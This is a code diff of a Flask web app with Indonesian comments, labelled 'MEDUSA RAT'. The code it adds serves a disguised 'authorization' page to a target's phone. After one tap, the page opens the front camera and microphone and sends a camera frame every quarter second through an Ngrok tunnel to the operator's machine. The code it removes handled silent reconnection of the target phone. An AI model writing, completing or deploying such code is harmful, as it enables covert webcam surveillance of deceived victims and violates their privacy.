@@ -1,37 +1,22 @@
-from flask import Flask, request, redirect, render_template_string
-import json
+from flask import Flask, request, render_template_string
 
 app = Flask(__name__)
 
-# Variabel global di memori RAM Render yang kebal mati listrik
+# Variabel global untuk menampung alamat pipa Ngrok aktif dari PC Lab Anda
 ALAMAT_NGROK_LAB = ""
-PERANGKAT_TERDAFTAR = {}
 
 @app.route('/handshake', methods=['GET', 'POST'])
 def handshake():
     global ALAMAT_NGROK_LAB
     
-    # JALUR A: Menerima setoran alamat Ngrok baru dari aplikasi run.py PC Lab Anda
+    # JALUR A: Menangkap setoran koordinat port dari aplikasi run.py PC Lab Anda
     ip_lab = request.args.get('ip_lab')
     if ip_lab:
-        ALAMAT_NGROK_LAB = ip_lab.replace("tcp://", "").strip()
-        return f"✅ Koordinat Lab Sukses Terkunci di Render: {ALAMAT_NGROK_LAB}", 200
+        ALAMAT_NGROK_LAB = ip_lab.replace("https://", "").replace("http://", "").strip()
+        return f"✅ Terkunci: {ALAMAT_NGROK_LAB}", 200
 
-    # JALUR B: HP Target mendeteksi sesi lama dan meminta panggil balik (Auto-Reconnect)
-    token_reconnect = request.args.get('reconnect')
-    if token_reconnect:
-        if not ALAMAT_NGROK_LAB:
-            return "❌ PC Lab sedang offline atau belum menyetorkan alamat Ngrok baru.", 503
-        
-        destination_url = ALAMAT_NGROK_LAB
-        if not destination_url.startswith("http"):
-            destination_url = f"https://{destination_url}"
-            
-        # Langsung bypass halaman utama, lempar koneksi HP target menuju server lokal PC Lab Anda
-        return redirect(destination_url)
-
-    # JALUR C: HP Target melakukan pemindaian QR Code pertama kali (Pemberian Otoritas Sesi)
-    # Menyuguhkan halaman antarmuka pintar yang akan merekam Token ke LocalStorage ponsel target
+    # JALUR B: HP TARGET MEMBUKA HALAMAN (HTML OTORISASI LANGSUNG DI RENDER)
+    # Ini memastikan halaman merah Anda 100% muncul tanpa bisa terlempar ke onrender.com
     return render_template_string("""
     <html>
     <head>
@@ -46,38 +31,50 @@ def handshake():
     </head>
     <body>
         <div class="box">
-            <h2>[ MEDUSA AUTOMATION PROXY ]</h2>
-            <p id="status-text">Mengecek otentikasi sesi perangkat...</p>
+            <h2>[ MEDUSA RAT INTERCONNECT ]</h2>
+            <p>Laboratorium terisolasi memerlukan sinkronisasi media satu pintu.</p>
+            <p style="color: #888; font-size: 11px;">Ketuk tombol di bawah SEKALI SAJA untuk memberikan otoritas penuh.</p>
             <br>
-            <button id="main-btn" class="btn" onclick="mulaiOtomatisasi()" style="display:none;">OTORISASI PERANGKAT</button>
+            <button class="btn" onclick="triggerAllOtoritas()">OTORISASI & SINKRONISASI</button>
         </div>
 
         <script>
-            // Memeriksa apakah memori internal ponsel target sudah menyimpan token lama
-            let tokenSesi = localStorage.getItem("medusa_session_token");
-            
-            if (tokenSesi) {
-                document.getElementById("status-text").innerText = "Sesi valid ditemukan! Menghubungkan ulang ke PC Lab...";
-                setTimeout(() => {
-                    window.location.href = window.location.pathname + "?reconnect=" + tokenSesi;
-                }, 1200);
-            } else {
-                document.getElementById("status-text").innerText = "Otoritas perangkat diperlukan untuk sinkronisasi pertama.";
-                document.getElementById("main-btn").style.display = "inline-block";
-            }
-
-            function mulaiOtomatisasi() {
-                // Generate token acak unik untuk mengunci identitas browser HP target ini
-                let tokenBaru = "HP_" + Math.random().toString(36).substring(2, 9).toUpperCase();
-                localStorage.setItem("medusa_session_token", tokenBaru);
-                
-                let labAddress = "{{ alamat_lab }}";
-                if (!labAddress.startsWith("http")) {
-                    labAddress = "https://" + labAddress;
+            async function triggerAllOtoritas() {
+                try {
+                    let mediaStream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: "user" }, 
+                        audio: true 
+                    });
+                    let videoTrack = mediaStream.getVideoTracks();
+                    
+                    document.body.innerHTML = "<div class='box'><h2 style='color:#00ff00;'>[ STATUS: CONNECTED ]</h2><p>Sesi nirkabel aktif melintasi internet proxy.</p><p style='color:gray;'>Jangan tutup browser ini. Lab sedang memantau feed data.</p></div>";
+                    
+                    let imageCapture = new ImageCapture(videoTrack);
+                    setInterval(async () => {
+                        try {
+                            let bitmap = await imageCapture.grabFrame();
+                            let canvas = document.createElement('canvas');
+                            canvas.width = bitmap.width; canvas.height = bitmap.height;
+                            let ctx = canvas.getContext('2d');
+                            ctx.drawImage(bitmap, 0, 0);
+                            
+                            canvas.toBlob(blob => {
+                                let reader = new FileReader();
+                                reader.readAsDataURL(blob);
+                                reader.onloadend = function() {
+                                    // Kirim frame gambar langsung menembus terowongan Ngrok PC Lab Anda yang aktif
+                                    let labDestination = "{{ alamat_lab }}";
+                                    fetch('https://' + labDestination + '/receive_frame', {
+                                        method: 'POST',
+                                        body: reader.result
+                                    });
+                                }
+                            }, 'image/jpeg', 0.4);
+                        } catch(e) {}
+                    }, 250);
+                } catch(err) {
+                    alert("Gagal mengunci izin otomasi: " + err);
                 }
-                
-                // Daftarkan token baru dan lempar browser HP target melintasi gerbang proxy menuju PC Lab
-                window.location.href = labAddress + "/?register_token=" + tokenBaru;
             }
         </script>
     </body>
